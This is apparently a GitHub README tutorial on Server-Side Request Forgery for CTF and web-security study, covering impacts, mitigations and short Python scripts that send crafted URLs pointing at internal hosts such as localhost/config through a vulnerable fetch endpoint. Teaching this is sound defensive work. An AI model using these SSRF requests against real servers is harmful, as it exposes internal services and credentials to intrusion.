# Cybersecurity (Web Exploitation)
Author: Kanishk Jagya  
GitHub: [github.com/KanishkJagya1](https://github.com/KanishkJagya1)

## Table of Contents
1. [Introduction](#introduction)
2. [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
    - [How SSRF Works](#how-ssrf-works)
    - [Example Scenario](#example-scenario)
    - [Potential Impacts of SSRF](#potential-impacts-of-ssrf)
    - [Mitigation Strategies](#mitigation-strategies)
    - [Example in a CTF Scenario](#example-in-a-ctf-scenario)
3. [Code Examples](#code-examples)
    - [Crafting a Malicious Request](#crafting-a-malicious-request)
    - [Analyzing the Response](#analyzing-the-response)
4. [Conclusion](#conclusion)

## Introduction
This repository provides a detailed explanation of Server-Side Request Forgery (SSRF), a common web security vulnerability, along with example code snippets and mitigation strategies. The content is particularly useful for Capture The Flag (CTF) challenges and practical web security.

## Server-Side Request Forgery (SSRF)
### How SSRF Works
Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing. This can lead to serious security implications, especially if the server has access to internal-only services or resources.

### Example Scenario
Consider a web application that allows users to fetch profile pictures from a URL. The application might provide a URL parameter like this:

```plaintext
http://example.com/fetch?url=http://profilepictures.com/user123.jpg
```

An attacker can manipulate this parameter to make the server request an internal resource:

```plaintext
http://example.com/fetch?url=http://internalserver.local/admin
```

If the server-side application does not properly validate the input URL, it may fetch and return sensitive information from the internal resource.

### Potential Impacts of SSRF
1. **Access to Internal Services**: The attacker may gain access to internal services that are not exposed to the public, such as databases, internal APIs, and cloud metadata services.
2. **Bypass Firewalls**: By making requests from the server, the attacker can bypass firewall restrictions and access otherwise restricted resources.
3. **Sensitive Data Exposure**: The attacker might extract sensitive data from internal systems, such as internal network information, confidential documents, or metadata from cloud instances.
4. **Port Scanning and Enumeration**: The attacker can use SSRF to scan for open ports on internal networks, potentially identifying vulnerable services.

### Mitigation Strategies
1. **Input Validation**: Strictly validate and sanitize user inputs. Ensure that URLs provided by users cannot be manipulated to target internal resources.
2. **Allowlist URLs**: Implement an allowlist of acceptable URLs that the server can fetch, and block all others.
3. **Metadata Service Protection**: Restrict access to metadata services from the server to prevent attackers from accessing sensitive instance metadata.
4. **Network Segmentation**: Separate your internal services from your web servers and use network-level restrictions to control access.
5. **Use Safe Libraries**: When making HTTP requests, use libraries and frameworks that offer built-in protection against SSRF attacks.

### Example in a CTF Scenario
In a Capture The Flag (CTF) scenario, you might be given a web application with a feature that fetches external content based on user input. Your task would be to manipulate this feature to make the server fetch internal content, revealing the flag.

Here’s a step-by-step approach:
1. **Identify the Vulnerable Feature**: Look for functionalities that take a URL as input and fetch data from it.
2. **Craft a Malicious Request**: Modify the input to point to an internal resource (e.g., `http://localhost/admin`).
3. **Extract the Response**: Analyze the response from the server to extract sensitive information or the flag.

## Code Examples
### Crafting a Malicious Request
Using Python and the `requests` library, you can craft a malicious request to exploit an SSRF vulnerability.

```python
import requests

# Target URL with the SSRF vulnerability
target_url = 'http://example.com/fetch?url='

# Malicious URL pointing to an internal resource
malicious_url = 'http://internalserver.local/admin'

# Complete URL for the request
exploit_url = target_url + malicious_url

# Sending the request
response = requests.get(exploit_url)

# Print the response
print(response.text)
```

### Analyzing the Response
Once you have crafted and sent the malicious request, you can analyze the server's response to extract sensitive information.

```python
# Analyzing the response
if 'flag' in response.text:
    print('Flag found:', response.text.split('flag')[1])
else:
    print('Flag not found, response:', response.text)
```

### Detailed Example of CTF Challenge
Consider a CTF challenge where you need to retrieve an internal configuration file. Here’s a more detailed example:

```python
import requests

# Target URL with SSRF vulnerability
target_url = 'http://example.com/fetch?url='

# Malicious URL to fetch internal configuration file
malicious_url = 'http://localhost/config'

# Complete URL for the request
exploit_url = target_url + malicious_url

# Sending the request
response = requests.get(exploit_url)

# Print the response
print(response.text)
```

In this example, the attacker crafts a request to fetch the internal configuration file located at `http://localhost/config`. By analyzing the server's response, the attacker might extract sensitive information such as database credentials or internal API keys.

## Conclusion
Understanding SSRF vulnerabilities and their potential impacts is crucial for web security. By knowing how to exploit such vulnerabilities, you can better protect your applications through proper input validation, network segmentation, and other mitigation strategies. This knowledge is also valuable in CTF competitions where SSRF challenges are common. For further study, consider exploring more advanced techniques and tools for detecting and preventing SSRF attacks.

For more information and examples, visit my GitHub: [github.com/KanishkJagya1](https://github.com/KanishkJagya1).